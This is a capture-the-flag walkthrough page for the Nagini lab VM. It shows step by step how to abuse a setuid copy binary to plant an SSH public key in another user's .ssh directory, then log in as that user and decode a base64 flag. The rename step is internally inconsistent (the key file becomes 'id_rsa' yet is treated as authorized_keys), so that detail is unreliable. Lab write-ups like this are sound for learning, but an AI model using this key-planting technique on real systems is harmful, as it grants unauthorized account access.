<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>5.1.2 Privilege user "Hermoine" (Getting the 2nd flag)</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>5.1.2 Privilege user "Hermoine" (Getting the 2nd flag)</h1><br/><br />In linux, there is a file called <code>authorized keys</code> with restrictive read and write permission. If we store our own public keys to that file, we should be able to login using our private key to the server.<br /><br />As we know that, <code>su_cp</code> has setuid permission of “hermoine”. <br /><br /><a href=""><img src="images/502-1.png" alt="images/502-1.png" /></a><br /><br />So, we can create a file authorized_keys using our user “snape”. Then, we can impersonate hermoine to give her permission to the file.<br /><br />1. On your Kali Machine create a “ssh key” with a blank passphrase using “ssh-keygen”.<br /><br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$cd</span>&nbsp;~/.ssh<br /><span style="color:#0057ae;font-weight:400">$ssh</span>-keygen</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />	<a href=""><img src="images/502-2.png" alt="images/502-2.png" /></a><br /><br />2. Show &lt;Your public key&gt;.<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$cat</span>&nbsp;id_rsa.pub</div></div> <br /><br />	<span style="color:#ffa500;">Output:</span><br />	<a href=""><img src="images/502-3.png" alt="images/502-3.png" /></a><br /><br />3. On the SSH connection copy the content to a new file.<br />	<div class="codebox"><div class="codebox">snape@Nagini:~<span style="color:#0057ae;font-weight:400">$echo</span>&nbsp;&lt;&lt;Your&nbsp;public&nbsp;key&gt;&gt;&nbsp;&gt;&nbsp;authorized_keys<br />snape@Nagini:~<span style="color:#0057ae;font-weight:400">$chmod</span>&nbsp;640&nbsp;authorized_keys<br />snape@Nagini:~<span style="color:#0057ae;font-weight:400">$ls</span>&nbsp;-al</div></div><br /><br />	<span style="color:#ffa500;">Output</span><br />	<a href=""><img src="images/502-4.png" alt="images/502-4.png" /></a><br /><br />4. Rename the file to “id_rsa”.<br />    <div class="codebox"><div class="codebox">snape@Nagini:~<span style="color:#0057ae;font-weight:400">$mv</span>&nbsp;authorized_keys&nbsp;id_rsa</div></div><br /> <br />5. Copy the authorized keys.<br />	<div class="codebox"><div class="codebox">snape@Nagini:~<span style="color:#0057ae;font-weight:400">$cd</span>&nbsp;/home/hermoine/bin<br />snape@Nagini:/home/hermoine/bin$./su_cp&nbsp;-p&nbsp;/home/snape/id_rsa&nbsp;/home/hermoine/.ssh/</div></div><br /><br />6. Login as “hermoine” user. <br /><span style="indent:1;">But this time, we have to use our private key since we don’t have password and we have already added our public key to the “authorized_keys” file.</span><br /><br />	On your Kali Machine run the following command.<br /><br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$ssh</span>&nbsp;hermoine@192.168.12.21&nbsp;-i&nbsp;.ssh/id_rsa</div></div><br /><br />	<span style="color:#ffa500;">Output</span>	<br />	<a href=""><img src="images/502-5.png" alt="images/502-5.png" /></a><br /><br />	You got access to hermoine.<br />	<br />7. Run the following commands to get the second flag.<br />	<div class="codebox"><div class="codebox">hermoine@Nagini:~<span style="color:#0057ae;font-weight:400">$ls</span><br />hermoine@Nagini:~<span style="color:#0057ae;font-weight:400">$cat</span>&nbsp;horcrux2.txt</div></div> <br />	<br />	<span style="color:#ffa500;">Output</span><br />	<a href=""><img src="images/502-6.png" alt="images/502-6.png" /></a><br /><br /><span style="indent:1;">The part in the curly brackets (NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=) is a base64 encoded string.</span><br /><br />8. Let&#39;s decode it. On your Kali Machine run the following command.<br />	<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$echo</span>&nbsp;<span style="color:#dd0000;font-weight:400">&#39;NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=&#39;</span>&nbsp;|&nbsp;base64&nbsp;--decode<br /></div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/502-7.png" alt="images/502-7.png" /></a><br />	<br />	<p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>